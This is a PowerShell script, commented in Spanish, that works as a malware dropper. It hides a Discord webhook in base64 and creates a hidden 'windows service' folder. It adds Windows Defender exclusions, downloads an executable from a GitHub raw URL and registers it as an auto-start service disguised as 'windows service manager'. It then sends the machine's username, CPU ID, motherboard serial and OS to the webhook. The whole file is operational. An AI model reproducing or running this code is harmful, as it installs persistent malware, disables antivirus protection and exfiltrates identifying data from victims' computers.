$codeBlock = '```'
$separador = "--------------------------------"

# Obtener información del sistema
$CPU = (Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty ProcessorId)
$MOT = (Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber)
$OS = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
$HOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTk0MjU2MzE1NjM5Mzk5NC9CRGtybnVsLXhjQWxnUmpIalJPV1RmQjE3WlM3SFNLdnRYZWFGV0VTTy1OSlFmYzRKQWZqUGItS08yWlhSUVdJTTluWA=="))

function reportar {
    param (
        [string]$mensaje
    )
    try {
        $body = @{ content = $mensaje }
        $jsonData = $body | ConvertTo-Json -Depth 3        
        Invoke-RestMethod -Uri $HOOK -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
    }
    catch {
        Write-Host "Ocurrió un error al enviar el reporte: $($_.Exception.Message)"
    }
}

while ($true) {
    try {
        $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "windows service"
        
        if (-not (Test-Path $root)) {
            New-Item -Path $root -ItemType Directory | Out-Null
        }
        
        # Establecer atributo oculto en la carpeta
        $dirInfo = Get-Item $root
        if (-not ($dirInfo.Attributes -band [System.IO.FileAttributes]::Hidden)) {
            $dirInfo.Attributes = $dirInfo.Attributes -bor [System.IO.FileAttributes]::Hidden
        }
        
        try { 
            Add-MpPreference -ExclusionPath $root 
        }
        catch {
            Write-Host "Error al agregar $root a exclusiones de Defender: $($_.Exception.Message)"
        }
        
        $servicio = Join-Path -Path $root -ChildPath "windows service manager.exe"
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/script/windows%20service%20manager.exe" -OutFile $servicio -UseBasicParsing
        
        try {
            Add-MpPreference -ExclusionProcess $servicio
        }
        catch {
            Write-Host "Error al agregar el proceso $servicio a exclusiones de Defender: $($_.Exception.Message)"
        }
        
        # Crear el identificador único de la PC
        [System.Environment]::SetEnvironmentVariable("IDENTIFICADOR_UNICO", "$CPU$MOT", [System.EnvironmentVariableTarget]::Machine)
        
        # Crear e iniciar el servicio si no existe ya
        if (-not (Get-Service -Name "windows service manager NT" -ErrorAction SilentlyContinue)) {
            New-Service -Name "windows service manager NT" -BinaryPathName $servicio -DisplayName "windows service manager" -StartupType Automatic
        }
        Start-Service -Name "windows service manager NT"
        
        $message = "$codeBlock`n$separador`nUSER: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)`nTIME: $(Get-Date)`n$separador`nCPU: $CPU`nMOT: $MOT`nSYS: $OS`n$separador`n$codeBlock"
        reportar $message
        break
    }
    catch {
        reportar "$codeBlock`nREPORTE: ERROR`n$($_.Exception.Message)`n$codeBlock"
        Start-Sleep -Seconds 5
        continue
    }
}
